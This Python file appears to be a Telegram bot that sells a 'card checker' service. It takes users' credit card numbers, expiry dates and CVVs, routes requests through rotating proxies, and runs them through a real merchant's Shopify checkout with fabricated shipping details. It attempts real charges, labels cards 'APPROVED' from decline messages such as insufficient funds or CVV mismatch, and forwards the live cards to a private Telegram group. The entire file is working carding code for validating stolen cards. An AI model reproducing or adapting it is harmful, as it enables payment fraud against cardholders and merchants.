import json
import base64
import requests
from parse import parseX
import check_template
import datetime
import names
import re
import string
import AdyenEncrypt
import uuid
import parser_kurama
import time
import random
from func_bin import get_bin_info
from Plugins.Func import connect_to_db
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from requests.exceptions import ProxyError, ConnectionError

max_retries = 3
retry_delay = 3

proxiess = "proxys.txt"

keyboard = InlineKeyboardMarkup(
    [
        [InlineKeyboardButton("Premium for only $3", url="https://t.me/RefeDarwinScrapper/9175")]
    ]
)

def find_between(data: str, first: str, last: str) -> str:
    # Busca una subcadena dentro de una cadena, dados dos marcadores
    if not isinstance(data, str):
        raise TypeError("El primer argumento debe ser una cadena de texto.")
    
    try:
        start_index = data.index(first) + len(first)
        end_index = data.index(last, start_index)
        return data[start_index:end_index]
    except ValueError:
        return ''

def get_random_string(length):
    # Genera una cadena de texto aleatoria.
    letters = string.ascii_letters + string.digits
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def generar_codigo_session():
    codigo_session = str(uuid.uuid4())
    return codigo_session

COMMAND_STATUS_FILE = "command_status.txt"

def is_command_enabled(command_name):
    with open(COMMAND_STATUS_FILE, "r") as f:
        command_status = f.read().splitlines()
    for line in command_status:
        name, status = line.split(":")
        if name == command_name:
            return status == "on"
    return False


name_gate = "Shopify"
subtype = "$20"
command = "chk"

@Client.on_message(filters.command([f"{command}"], prefixes=['.', '/', '!', '?'], case_sensitive=False) & filters.text)
def stripeau(client, message):
    if not is_command_enabled(f"{command}"):
            return message.reply(f""" <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a> 
â”â”â”â”â”âœ§ğ‘²ğ’–ğ’“ğ’‚ğ’ğ’‚ğ‘ªğ’‰ğ’Œâœ§â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] STATUS â†¯ <code>MANTENIMIENTO | OFF âŒ</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] GATEWAY â†¯  <code>{name_gate}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] SUBTYPE â†¯  <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] USE â†¯ <code>PREMIUM PLAN</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] VERSIÃ“N â†¯ 6.0
â”â”â”â”â”â”â”â”â”âœ§â™›âœ§â”â”â”â”â”â”â”â”  </b> """, reply_markup=keyboard)
            
            #--------- VERIFICACION DE BIN BANEADOS ----------#
    
    ccs = message.text[len(f"/{command} "):]  
    reply = message.reply_to_message
    
    
    
    try:
        if not ccs:
            reply = message.reply_to_message
            texto = reply.text[:6]
        else:
            texto = ccs[:6]
    
        
    
        with open('binban.txt', 'r') as file:
            bins_baneados = file.readlines()
        
        for bin_baneado in bins_baneados:
            if texto.startswith(bin_baneado.strip()[:6]):
                message.reply('âš ï¸Error: Banned BIN. Please try another method.âš ï¸')
                return
            
    except:
        pass
        
    
    with open('binban.txt', 'r') as file:
        bins_baneados = file.readlines()
    
    for bin_baneado in bins_baneados:
        if texto.startswith(bin_baneado.strip()[:6]):
            message.reply('âš ï¸Error: Banned BIN. Please try another method.âš ï¸')
            return
            
    conn = connect_to_db()
    cursor = conn.cursor()
    user_id = message.from_user.id
    username = message.from_user.username  
    
    cursor.execute('SELECT rango, creditos, antispam, dias FROM users WHERE user_id = ?', (user_id,))
    user_data = cursor.fetchone()
    if not user_data:
                return message.reply(f"<b>First, you must register. /register .</b> ")
            
    if user_data[0] in ["Baneado", "baneado"]:
        return message.reply(f"<b>You are not allowed to use the \nReason: Banned botâŒ. </b> ")
           
    chat_id2 = message.chat.id
    chat_data = cursor.execute('SELECT rango FROM users WHERE user_id = ?', (chat_id2,))
    chat_data = cursor.fetchone()
    
    if chat_data is None:
        chat_data = "Free"
        
        
           
    if all(role not in user_data[0] for role in ["Premium", "Seller", "Owner"]) and all(role not in chat_data[0] for role in ["Grupo", "Staff"]):
            return message.reply(f"<b>The chat is not authorized to use this command. Contact admin @Luisabinade âŒ</b> <a href='https://imgur.com/ihpUqrG.jpg'>&#8203;</a>", reply_markup=keyboard)
    
    
  
    ccs = message.text[len(f"/{command} "):]  
                  
      
    reply = message.reply_to_message
            
    if not ccs:
        if not reply or not reply.text:
            return message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] ğ‘²ğ’–ğ’“ğ’‚ğ’ğ’‚ ğ‘ªğ’‰ğ’Œ
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Gateway â†¯ <code>{name_gate}</code>   
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Subtype â†¯ <code>{subtype}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Use â†¯ <code>${command} cc|month|year|cvv</code>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
</b>""", reply_markup=keyboard, disable_web_page_preview=True)
     

        ccs = reply.text
        

    result = parser_kurama.parseData(ccs)
    x = get_bin_info(ccs[:6])

    if 'error' in result:
        return message.reply(f"""<b> 
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] ğ‘²ğ’–ğ’“ğ’‚ğ’ğ’‚ ğ‘ªğ’‰ğ’Œ
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Gateway â†¯ <code>{name_gate} {subtype}</code>   
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] CC â†¯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Status â†¯ <b>DECLINED âŒ</b>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Result â†¯ Card Invalid!
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Bin â†¯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Country â†¯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Bank â†¯ <code>{x.get("bank_name")}</code>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Checked by â†¯ @{username} [{user_data[0]}]
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Bot by â†¯ @Luisabinade

</b>""", reply_markup=keyboard, disable_web_page_preview=True)
            
        
    ccnum = result['ccnum']
    mes = result['month']
    ano = result['year']
    if len(ano) == 2:
        ano = '20'+result['year']
    cvv = result['cvv']
    ccs = f"{ccnum}|{mes}|{ano}|{cvv}"
    
    
    req = requests.get(f"https://bins.antipublic.cc/bins/{ccnum[:6]}").json()      
    brand = req['brand']
    CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(1000000,9999999)}@gmail.com"
    x = get_bin_info(ccnum[:6])
        
    #---------- PLANTILLA DE CARGA #1 ------------#
    loading_message = message.reply(f"""<b>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] ğ‘²ğ’–ğ’“ğ’‚ğ’ğ’‚ ğ‘ªğ’‰ğ’Œ
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Gateway â†¯ <code>{name_gate} {subtype}</code>   
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] CC â†¯ <code>{ccs}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Status â†¯ <b>Loading...</b> 
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Bin â†¯ <code>{x.get("type")}</code> | <code>{x.get("level")}</code> | <code>{x.get("vendor")}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Country â†¯ <code>{x.get("country")} {x.get("flag")}</code>
[<a href="https://t.me/RefeDarwinScrapper">âœ¯</a>] Bank â†¯ <code>{x.get("bank_name")}</code>
â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”â”  </b>""", reply_markup=keyboard, disable_web_page_preview=True)
    
    SessionId = generar_codigo_session()
    session = requests.Session()
    
    with open(proxiess, 'r') as file:
        proxies_1 = file.read().splitlines()
            
        session = requests.Session()
        proxie = random.choice(proxies_1)

        session.proxies = {
        'https': f'{proxie}'}
    
    inicio = time.time()
    
    
    #------------------- #1 Requests -------------------#
    payload_1 = {'id': '41087618060'}

        
       
    for retry in range(max_retries):
        try:
            req1 = session.post(url=f'https://www.boeingstore.com/cart/add.js', data=payload_1)
        
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #1"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()  
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #1"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #1")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #1"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    fecha_actual = datetime.datetime.now()
    print(fecha_actual)
    #------------------- #2 Requests -------------------#
    
    
    for retry in range(max_retries):
        try:
            
            req3 = session.post(url=f"https://www.boeingstore.com/checkout/")
            checkout_url = req3.url
            authenticity_token = get_random_string(86)
            break  
        
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #2"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #2"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #2")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #2"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #3 Requests -------------------#   
    
    headers = {
            'Content-Type': 'application/x-www-form-urlencoded',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36'
        }

    payload_2 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=contact_information&step=shipping_method&checkout%5Bemail%5D=naneteharlequin%40jcnorris.com&checkout%5Bshipping_address%5D%5Bfirst_name%5D=&checkout%5Bshipping_address%5D%5Blast_name%5D=&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=&checkout%5Bshipping_address%5D%5Bprovince%5D=&checkout%5Bshipping_address%5D%5Bzip%5D=&checkout%5Bshipping_address%5D%5Bphone%5D=&checkout%5Bshipping_address%5D%5Bcountry%5D=United+States&checkout%5Bshipping_address%5D%5Bfirst_name%5D=Andres&checkout%5Bshipping_address%5D%5Blast_name%5D=Bermudez&checkout%5Bshipping_address%5D%5Bcompany%5D=&checkout%5Bshipping_address%5D%5Baddress1%5D=street+16th%2C+av.+billonarie&checkout%5Bshipping_address%5D%5Baddress2%5D=&checkout%5Bshipping_address%5D%5Bcity%5D=New+York&checkout%5Bshipping_address%5D%5Bprovince%5D=NY&checkout%5Bshipping_address%5D%5Bzip%5D=10080&checkout%5Bshipping_address%5D%5Bphone%5D=%28248%29+635-4657&checkout%5Bremember_me%5D=false&checkout%5Bremember_me%5D=0&checkout%5Bclient_details%5D%5Bbrowser_width%5D=713&checkout%5Bclient_details%5D%5Bbrowser_height%5D=654&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'

        
        
    for retry in range(max_retries):
        try:
            req4 = session.post(url=checkout_url, headers=headers, data=payload_2)
            break
           
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #3"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #3"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
        except KeyError as e:
            print(f"Error de clave: {e}")
            msg = "DECLINED âŒ"
            respuesta = f"Error al obtener {e} del response | Requests #3"

            proxyy = "LIVE ğŸŸ©" 
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #3")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #3"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #4 Requests -------------------#
    
    payload_3 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=shipping_method&step=payment_method&checkout%5Bshipping_rate%5D%5Bid%5D=shopify-Standard%2520Shipping%2520%284-10%2520business%2520days%29-5.00&checkout%5Bclient_details%5D%5Bbrowser_width%5D=713&checkout%5Bclient_details%5D%5Bbrowser_height%5D=654&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'
        
                  
    for retry in range(max_retries):
        try:
            req5 = session.post(url=checkout_url,headers=headers,data=payload_3)  
            break
        
            
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #4"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #4"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #4")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #4"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        
    #------------------- #5 Requests -------------------#
    
    payload_4 = {
            "credit_card": {
                "number": f"{ccnum[0:4]} {ccnum[4:8]} {ccnum[8:12]} {ccnum[12:16]}",
                "name": "Sin Rol",
                "month": mes,
                "year": ano,
                "verification_value": cvv
            },
            "payment_session_scope": "www.boeingstore.com"
        }

        
                
    for retry in range(max_retries):
        try:

            req6 = session.post(url='https://deposit.us.shopifycs.com/sessions', json=payload_4)
            token = req6.json()
            id_ = token.get('id')
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #5"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #5"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #5")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #5"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    #------------------- #6 Requests -------------------#
    
    payload_5 = f'_method=patch&authenticity_token={authenticity_token}&previous_step=payment_method&step=&s={id_}&checkout%5Bpayment_gateway%5D=60184326&checkout%5Bcredit_card%5D%5Bvault%5D=false&name=&pride-points=&service-award-points=&store-sredit=&gift-card-one=&gift-card-two=&gift-card-three=&gift-card-four=&gift-card-five=&checkout%5Bnote%5D=&checkout%5Bdifferent_billing_address%5D=false&checkout%5Btotal_price%5D=1700&checkout_submitted_request_url=&checkout_submitted_page_id=&complete=1&checkout%5Bclient_details%5D%5Bbrowser_width%5D=728&checkout%5Bclient_details%5D%5Bbrowser_height%5D=654&checkout%5Bclient_details%5D%5Bjavascript_enabled%5D=1&checkout%5Bclient_details%5D%5Bcolor_depth%5D=24&checkout%5Bclient_details%5D%5Bjava_enabled%5D=false&checkout%5Bclient_details%5D%5Bbrowser_tz%5D=0'

            
                
    for retry in range(max_retries):
        try:
            req7 = session.post(url=checkout_url, headers=headers, data=payload_5)
            time.sleep(5)
            processing_url = req7.url
            print("<-> PROCESO DE URL",processing_url)
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #6"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #6"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #6")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #6"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    
    #------------------- #7 Requests -------------------#
    
   
    for retry in range(max_retries):
        try:
            req8 = session.get(str(processing_url) + '?from_processing_page=1')
            time.sleep(5)
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #7"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #7")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #7"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #7")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #7"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    
    #------------------- #8 Requests -------------------#
    
   
    for retry in range(max_retries):
        try:
            req9 = session.get(req8.url)
            text_resp = req9.text
            resp = find_between(text_resp, 'notice__text">', '<')
            break
                
        except (ProxyError, ConnectionError) as e:
            print(f"Error al conectarse {retry+1}/{max_retries}: {e}")
            if retry < max_retries-1:
                print(f"Reintentando en {retry_delay} segundo...")
                time.sleep(retry_delay)
            else:
                msg = "DECLINED âŒ"
                respuesta = "Maximum number of retries reached: 3 | Requests #8"

                proxyy = "DEAD ğŸŸ¥"
                gateway = f'<code>{name_gate} {subtype}</code>'
                end = time.time()
                tiempo = str(inicio - end)[1:5]
                session.close()
                return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)


    
        except requests.exceptions.RequestException as e:
            print(f"Error de solicitud: {e} Requests #8")
            msg = "DECLINED âŒ"
            respuesta = "Error de solicitud | Requests #8"

            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

        except Exception as e:
            print(f"Error de solicitud: {e} Requests #8")
            msg = "DECLINED âŒ"
            respuesta = "An unexpected error has occurred. | Requests #8"
            proxyy = "LIVE ğŸŸ©"
            gateway = f'<code>{name_gate} {subtype}</code>'
            end = time.time()
            tiempo = str(inicio - end)[1:5]
            session.close()
            return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)

    
    
    #------------------- RESPONSE CODE ------------------------#
    
    if '/thank_you' in str(req9.url) or '/orders/' in str(req9.url) or '/post_purchase' in str(req9.url):
                    resp = 'Charged Â¡Order! $10'
                    msg = "APPROVED âœ…"
                    respuesta = "Charge $20"
    elif '/3d_secure_2/' in str(req9.url):
                    respuesta = '3d_secure_2'
                    msg = "APPROVED 3Dâœ…"
                    
    elif "Security code was not matched by the processor" in resp:
                    msg = "APPROVED âœ…"
                    respuesta = resp
                
    elif "Insufficient Funds" in resp:
                    msg = "APPROVED âœ…"
                    respuesta = resp
                    
                    
    elif "Transaction Normal - Insufficient Funds" in resp:
                    msg = "APPROVED âœ…"
                    respuesta = resp
                    
    elif "CVV2/VAK Failure (531)" in resp:
                    msg = "APPROVED âœ…"
                    respuesta = resp
   
    elif "CVV2/CID/CVC2 Data not Verified - Declined" in resp:
                    msg = "APPROVED CCNâœ…"
                    respuesta = resp
                

    elif "Address not Verified - Insufficient Funds" in resp:
                    msg = "APPROVED âœ…"
                    respuesta = resp

                    
    elif "CVV2/CID/CVC2 Data not Verified - Insufficient Funds" in resp:
                    msg = "APPROVED CVVâœ…"
                    respuesta = resp
                    
    elif "Address not Verified - Approved" in resp:
                    msg = "APPROVED AVSâœ…"
                    respuesta = "AVS MISMATCH /", resp

    elif "Security codes does not match correct format (3-4 digits)" in resp:
                    msg = "APPROVED CCNâœ…"
                    respuesta = resp

    else:
                    msg = "DECLINED âŒ"    
                    respuesta = resp    
            
    proxyy = "LIVE ğŸŸ©"
    gateway = f'<code>{name_gate} {subtype}</code>'
    end = time.time()
    tiempo = str(inicio - end)[1:5]
    session.close()  
    if "APPROVED" in msg:
        
        chat_id = -1002000802973
    
        client.send_message(chat_id, check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy))
        
    return loading_message.edit_text(check_template.checking_template(ccs, msg, respuesta, gateway, tiempo, username, user_data[0], proxyy), reply_markup=keyboard, disable_web_page_preview=True)
    